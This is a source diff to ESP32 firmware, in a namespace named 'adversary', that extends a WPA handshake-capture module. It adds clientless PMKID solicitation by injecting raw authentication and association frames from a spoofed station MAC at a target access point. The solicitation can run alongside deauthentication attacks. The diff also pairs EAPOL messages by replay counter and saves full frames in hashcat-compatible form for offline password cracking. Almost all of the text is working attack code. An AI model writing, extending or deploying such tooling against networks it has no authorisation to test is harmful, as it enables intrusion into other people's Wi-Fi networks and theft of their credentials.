@@ -15,6 +15,8 @@
 #include "modules/wifi/station_scanner.h"
 #include "core/event_bus.h"
 #include "utils/log.h"
+#include "utils/raw_wifi.h"       // softAP raw TX for solicitation frames
+#include "utils/pmkid_solicit.h"  // Pure, unit-tested auth/assoc frame builders (ADR-0138)
 #endif
 
 namespace adversary {
@@ -269,8 +271,15 @@ bool HandshakeCapture::start(const HandshakeCaptureConfig& config) {
     
     lastDeauthTime_ = 0;
     deauthBurstCount_ = 0;
+
+    // Arm clientless PMKID solicitation if requested (config_.solicitPmkid). The injector
+    // fires on the first update() tick (solicitLastMs_ = 0 is always >= one interval ago).
+    solicitAttempts_ = 0;
+    solicitLastMs_ = 0;
+    solicitExhausted_ = false;
+
     setState(HandshakeState::WAITING);
-    
+
     return true;
 }
 
@@ -300,7 +309,23 @@ void HandshakeCapture::update() {
     
 #ifdef ESP32
     uint32_t now = millis();
-    
+
+    // Clientless PMKID (ADR-0138/0139): inject an auth+assoc blind pair to solicit M1. This is
+    // a parallel injector; the promiscuous path records any resulting PMKID keyed on our
+    // spoofed STA MAC and publishes PMKID_CAPTURED, which the screen saves and counts off.
+    if (config_.solicitPmkid) {
+        updateSolicitation(now);
+        // Pure clientless (solicit on, deauth off): the solicitation result is the whole
+        // outcome, so it owns the terminal state and the 4-way grace logic below never runs.
+        if (!config_.autoDeauth) {
+            if (hasPMKID_) setState(HandshakeState::CRACKABLE);
+            else if (solicitExhausted_) setState(HandshakeState::TIMEOUT);
+            return;
+        }
+        // "Both" strategy (ADR-0139): fall through so deauth + the 4-way flow run in parallel;
+        // a solicited PMKID is handled off PMKID_CAPTURED by the screen, not here.
+    }
+
     // Check grace period for minimum valid handshake
     // Wait for remaining messages before declaring CRACKABLE
     if (waitingForComplete_ && (now - graceStartTime_ >= GRACE_PERIOD_MS)) {
@@ -491,13 +516,13 @@ void HandshakeCapture::processEAPOL(const uint8_t* data, uint16_t length, int8_t
             break;
         case HandshakeMessage::MSG2:
             stats_.msg2Count++;
-            processMessage2(eapolStart, eapolLen, data, length);
+            processMessage2(eapolStart, eapolLen, data, length, clientMac);
             // Save client MAC
             memcpy(handshake_.clientMac, clientMac, 6);
             break;
         case HandshakeMessage::MSG3:
             stats_.msg3Count++;
-            processMessage3(eapolStart, eapolLen, data, length);
+            processMessage3(eapolStart, eapolLen, data, length, clientMac);
             break;
         case HandshakeMessage::MSG4:
             stats_.msg4Count++;
@@ -528,27 +553,44 @@ void HandshakeCapture::setState(HandshakeState newState) {
 #endif
 }
 
+namespace {
+/// Read the 8-byte big-endian EAPOL-Key replay counter. @p eapolData points at
+/// the EAPOL header; the key frame follows at +4, with the counter at key-frame
+/// offset 5 (after descriptor type, key info, key length). Caller guarantees
+/// eapolLen >= 99, so these bytes are present.
+uint64_t readReplayCounter(const uint8_t* eapolData) {
+    const uint8_t* keyFrame = eapolData + 4;
+    uint64_t counter = 0;
+    for (int i = 0; i < 8; ++i) counter = (counter << 8) | keyFrame[5 + i];
+    return counter;
+}
+}  // namespace
+
 void HandshakeCapture::processMessage1(const uint8_t* eapolData, uint16_t eapolLen,
                                         const uint8_t* frameData, uint16_t frameLen,
                                         const uint8_t* clientMac) {
     if (eapolLen < 99) return;
-    
+
     // Extract ANonce (32 bytes at offset 17 in EAPOL-Key)
     const uint8_t* keyFrame = eapolData + 4;  // Skip EAPOL header
     memcpy(handshake_.anonce, keyFrame + 13, 32);  // Nonce offset in key frame
-    
+
     // Save FULL 802.11 frame (not just EAPOL) for WPA-SEC/hashcat compatibility
     uint16_t copyLen = (frameLen < sizeof(handshake_.msg1Data)) ? frameLen : sizeof(handshake_.msg1Data);
     memcpy(handshake_.msg1Data, frameData, copyLen);
     handshake_.msg1Len = copyLen;
     handshake_.hasMsg1 = true;
+
+    // Record station + replay counter so M1 can be paired with M2 (ADR-0145).
+    memcpy(handshake_.msg1Client, clientMac, 6);
+    handshake_.msg1Replay = readReplayCounter(eapolData);
     
     // Key descriptor version
     uint16_t keyInfo = (keyFrame[1] << 8) | keyFrame[2];
     handshake_.keyDescVer = keyInfo & KEY_INFO_DESC_VER_MASK;
     
     // Extract a clientless-crackable PMKID when the AP put a PMKID KDE in M1's
-    // Key Data. The hashcat WPA*02 line is keyed on the supplicant MAC the AP
+    // Key Data. The hashcat WPA*01 PMKID line is keyed on the supplicant MAC the AP
     // used (PMKID = HMAC-SHA1(PMK, "PMK Name" | AP | STA)), so the station is the
     // client M1 was addressed to, not our own MAC.
     uint8_t pmkid[utils::PMKID_LENGTH];
@@ -568,21 +610,26 @@ void HandshakeCapture::processMessage1(const uint8_t* eapolData, uint16_t eapolL
 }
 
 void HandshakeCapture::processMessage2(const uint8_t* eapolData, uint16_t eapolLen,
-                                        const uint8_t* frameData, uint16_t frameLen) {
+                                        const uint8_t* frameData, uint16_t frameLen,
+                                        const uint8_t* clientMac) {
     if (eapolLen < 99) return;
-    
+
     // Extract SNonce (32 bytes)
     const uint8_t* keyFrame = eapolData + 4;
     memcpy(handshake_.snonce, keyFrame + 13, 32);
-    
+
     // Extract MIC (16 bytes at offset 77 in key frame)
     memcpy(handshake_.mic, keyFrame + 77, 16);
-    
+
     // Save FULL 802.11 frame for WPA-SEC/hashcat compatibility
     uint16_t copyLen = (frameLen < sizeof(handshake_.msg2Data)) ? frameLen : sizeof(handshake_.msg2Data);
     memcpy(handshake_.msg2Data, frameData, copyLen);
     handshake_.msg2Len = copyLen;
     handshake_.hasMsg2 = true;
+
+    // Record station + replay counter so M2 can be paired with M1/M3 (ADR-0145).
+    memcpy(handshake_.msg2Client, clientMac, 6);
+    handshake_.msg2Replay = readReplayCounter(eapolData);
     
     // Update state (order-independent)
     updateCaptureState();
@@ -596,22 +643,27 @@ void HandshakeCapture::processMessage2(const uint8_t* eapolData, uint16_t eapolL
 }
 
 void HandshakeCapture::processMessage3(const uint8_t* eapolData, uint16_t eapolLen,
-                                        const uint8_t* frameData, uint16_t frameLen) {
+                                        const uint8_t* frameData, uint16_t frameLen,
+                                        const uint8_t* clientMac) {
     if (eapolLen < 99) return;
-    
+
     // MSG3 also contains ANonce - extract it if we don't have MSG1
     const uint8_t* keyFrame = eapolData + 4;
-    
+
     // If we don't have MSG1 yet, get ANonce from MSG3
     if (!handshake_.hasMsg1) {
         memcpy(handshake_.anonce, keyFrame + 13, 32);
     }
-    
+
     // Save FULL 802.11 frame for WPA-SEC/hashcat compatibility
     uint16_t copyLen = (frameLen < sizeof(handshake_.msg3Data)) ? frameLen : sizeof(handshake_.msg3Data);
     memcpy(handshake_.msg3Data, frameData, copyLen);
     handshake_.msg3Len = copyLen;
     handshake_.hasMsg3 = true;
+
+    // Record station + replay counter so M3 can pair with M2 when M1 was missed (ADR-0145).
+    memcpy(handshake_.msg3Client, clientMac, 6);
+    handshake_.msg3Replay = readReplayCounter(eapolData);
     
     // Update state (order-independent)
     updateCaptureState();
@@ -842,6 +894,7 @@ void HandshakeCapture::recordPmkid(const uint8_t* pmkid, const uint8_t* clientMa
     memcpy(pmkid_.staMac, clientMac, 6);
     strncpy(pmkid_.ssid, config_.targetSsid, 32);
     pmkid_.ssid[32] = '\0';
+    pmkid_.channel = config_.channel;  // locked capture channel, for the manifest record
     hasPMKID_ = true;
 
 #ifdef ESP32
@@ -859,5 +912,47 @@ void HandshakeCapture::recordPmkid(const uint8_t* pmkid, const uint8_t* clientMa
     pmkidEvt.payload.handshake.type = 1; // PMKID
     EventBus::getInstance().publish(pmkidEvt);
 }
+
+#ifdef ESP32
+void HandshakeCapture::updateSolicitation(uint32_t now) {
+    // Inject-only (ADR-0139): stop once a PMKID lands (recordPmkid already published
+    // PMKID_CAPTURED) or once the attempt bound is hit. The caller in update() turns these
+    // conditions into the terminal state, so this can run alongside deauth without owning it.
+    if (hasPMKID_ || solicitExhausted_) return;
+    if (solicitAttempts_ >= SOLICIT_MAX_ATTEMPTS) {
+        solicitExhausted_ = true;
+        return;
+    }
+
+    if (now - solicitLastMs_ < SOLICIT_INTERVAL_MS) return;
+    solicitLastMs_ = now;
+    ++solicitAttempts_;  // count before sending so a wedged send still advances the bound
+
+    uint8_t frame[utils::SOLICIT_FRAME_BUF_LEN];
+    const uint8_t* src = utils::defaultSolicitStaMac();
+
+    const uint16_t authLen =
+        utils::buildAuthRequest(frame, sizeof(frame), config_.targetBssid, src);
+    if (authLen == 0) { LOG_E("HS", "Solicit auth build failed"); return; }
+    const TxResult authTx = RawWiFi::transmit(WiFiInterface::AP, frame, authLen, false);
+
+    delay(SOLICIT_INTER_FRAME_MS);  // measured auth->assoc gap that drew M1 (ADR-0138)
+
+    const uint16_t assocLen = utils::buildAssocRequest(frame, sizeof(frame),
+                                                       config_.targetBssid, src,
+                                                       config_.targetSsid);
+    if (assocLen == 0) { LOG_E("HS", "Solicit assoc build failed"); return; }
+    const TxResult assocTx = RawWiFi::transmit(WiFiInterface::AP, frame, assocLen, false);
+
+    if (!authTx.success || !assocTx.success) {
+        LOG_W("HS", "Solicit TX attempt %u/%u: auth ok=%d assoc ok=%d",
+              (unsigned)solicitAttempts_, (unsigned)SOLICIT_MAX_ATTEMPTS,
+              authTx.success, assocTx.success);
+    } else {
+        LOG_I("HS", "Solicit PMKID attempt %u/%u sent",
+              (unsigned)solicitAttempts_, (unsigned)SOLICIT_MAX_ATTEMPTS);
+    }
+}
+#endif
 
 } // namespace adversary
